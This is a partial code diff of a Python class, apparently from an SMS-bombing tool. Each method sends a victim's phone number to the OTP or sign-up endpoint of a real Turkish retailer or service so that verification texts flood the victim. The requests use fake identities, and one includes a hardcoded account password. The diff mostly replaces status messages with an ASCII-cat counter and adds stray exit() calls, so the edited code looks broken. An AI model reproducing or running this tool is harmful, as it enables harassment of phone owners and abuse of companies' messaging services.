-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #hayatsu.com.tr
     def Hayatsu(self):
@@ -309,13 +516,25 @@ class SendSms():
             data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.json()["is_success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hayatsu.com.tr")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hayatsu.com.tr")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #hizliecza.com.tr
     def Hizliecza(self):
@@ -325,13 +544,25 @@ class SendSms():
             json={"otpOperationType": 2, "phoneNumber": f"+90{self.phone}"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["isSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hizlieczaprodapi.hizliecza.net")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hizlieczaprodapi.hizliecza.net")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #ipragaz.com.tr
     def Ipragaz(self):
@@ -341,13 +572,25 @@ class SendSms():
             json={"birthDate": "2/7/2000", "carPlate": "31 ABC 31", "mobileOtp": "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63", "name": "Memati Bas", "otp": "", "phoneNumber": self.phone, "playerId": ""}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #metro-tr.com
     def Metro(self):
@@ -357,13 +600,25 @@ class SendSms():
             json={"methodType": "2", "mobilePhoneNumber": f"+90{self.phone}"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["status"] == "success":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> feature.metro-tr.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> feature.metro-tr.com")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
     
     #qumpara.com
     def Qumpara(self):
@@ -373,13 +628,25 @@ class SendSms():
             json={"msisdn": f"+90{self.phone}"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tr-api.fisicek.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tr-api.fisicek.com")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #paybol.com.tr
     def Paybol(self):
@@ -389,13 +656,25 @@ class SendSms():
             json={"phone_number": f"90{self.phone}"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["status"] == 0:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pyb-mobileapi.walletgate.io")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pyb-mobileapi.walletgate.io")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
         
     #migros.com.tr
     def Migros(self):
@@ -405,13 +684,25 @@ class SendSms():
             json={"email": self.mail, "phoneNumber": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["successful"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #file.com.tr
     def File(self):
@@ -421,13 +712,25 @@ class SendSms():
             json={"mobilePhoneNumber": f"90{self.phone}"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["responseType"] == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #joker.com.tr
     def Joker(self):
@@ -437,13 +740,25 @@ class SendSms():
             json={"firstName": "Memati", "gender": "m", "iosVersion": "4.0.2", "lastName": "Bas", "os": "IOS", "password": "31ABC..abc31", "phoneNumber": f"0{self.phone}", "username": self.mail}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["message"] == "Doğrulama kodu gönderildi.":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.joker.com.tr")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.joker.com.tr")
-            
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1            
         
     #ak-asya.com.tr
     def Akasya(self):
@@ -453,13 +768,27 @@ class SendSms():
             json={"phone": self.phone}
             r = requests.post(url=url, headers=headers, json=json, timeout=6)
             if r.json()["result"] == "SMS sended succesfully!":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akasya-admin.poilabs.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
+                exit()
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akasya-admin.poilabs.com")
-        
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            exit()
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1        
         
     #akbati.com
     def Akbati(self):
@@ -469,13 +798,25 @@ class SendSms():
             json={"phone": self.phone}
             r = requests.post(url=url, headers=headers, json=json, timeout=6)
             if r.json()["result"] == "SMS sended succesfully!":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akbati-admin.poilabs.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akbati-admin.poilabs.com")
-    
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1    
     
     #clickmelive.com
     def Clickme(self):
@@ -485,13 +826,25 @@ class SendSms():
             json={"phone": self.phone}
             r = requests.post(url=url, json=json, headers=headers, timeout=6)
             if r.json()["isSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobile-gateway.clickmelive.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobile-gateway.clickmelive.com")
-    
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1    
     
     #happy.com.tr
     def Happy(self):
@@ -501,13 +854,25 @@ class SendSms():
             data = {"telephone": self.phone}
             r = requests.post(url=url, data=data, headers=headers, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> happy.com.tr")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> happy.com.tr")
-    
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1    
 
     #komagene.com.tr
     def Komagene(self):
@@ -517,13 +882,25 @@ class SendSms():
             headers = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}
             r = requests.post(url=url, headers=headers, json=json, timeout=6)
             if r.json()["Success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com.tr")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.komagene.com.tr")
-    
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1    
     
     #kuryemgelsin.com
     def KuryemGelsin(self):
@@ -532,13 +909,25 @@ class SendSms():
             json={"phoneNumber": self.phone, "phone_country_code": "+90"}
             r = requests.post(url=url, json=json, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kuryemgelsin.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kuryemgelsin.com")
-    
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1    
     
     #porty.tech
     def Porty(self):
@@ -548,13 +937,25 @@ class SendSms():
             json={"job": "start_login", "phone": self.phone}
             r = requests.post(url=url, json=json, headers=headers, timeout=6)
             if r.json()["status"]== "success":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> panel.porty.tech")
-            
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1            
     
     #taksim.digital
     def Taksim(self):
@@ -564,13 +965,25 @@ class SendSms():
             json={"countryPhoneCode": "+90", "name": "Memati", "phoneNo": self.phone, "surname": "Bas"}
             r = requests.post(url=url, headers=headers, json=json, timeout=6)
             if r.json()["success"]== True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> service.taksim.digital")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> service.taksim.digital")
-    
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1    
     
     #vakiftasdelensu.com
     def Tasdelen(self):
@@ -579,13 +992,25 @@ class SendSms():
             json= {"PhoneNumber": self.phone, "user": {"Password": "Aa123!35@1","UserName": "MobilOperator"}}
             r = requests.post(url=url, json=json, timeout=6)
             if r.json()["Result"]== True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 94.102.66.162:80")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 94.102.66.162:80")
-    
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1    
     
     #tasimacim.com
     def Tasimacim(self):
@@ -594,13 +1019,25 @@ class SendSms():
             json= {"phone": self.phone, "lang": "tr"}
             r = requests.post(url=url, json=json, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> server.tasimacim.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> server.tasimacim.com")
-    
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1    
     
     #toptanteslim.com
     def ToptanTeslim(self):
@@ -610,13 +1047,25 @@ class SendSms():
             json={"ADRES": "ZXNlZGtm", "DIL": "tr_TR", "EPOSTA": self.mail, "EPOSTA_BILDIRIM": True, "ILCE": "BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R", "ISLEM": "KayitOl", "ISTEMCI": "BEABC9B2-A58F-3131-AF46-2FF404F79677", "KIMLIKNO": None, "KULLANICI_ADI": "Memati", "KULLANICI_SOYADI": "Bas", "PARA_BIRIMI": "TL", "PAROLA": "312C6383DE1465D08F635B6121C1F9B4", "POSTAKODU": "377777", "SEHIR": "\xc4\xb0STANBUL", "SEMT": "BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R MAH.", "SMS_BILDIRIM": True, "TELEFON": self.phone, "TICARI_UNVAN": "kdkd", "ULKE_ID": 1105, "VERGI_DAIRESI": "sjje", "VERGI_NU": ""}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["Durum"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> toptanteslim.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
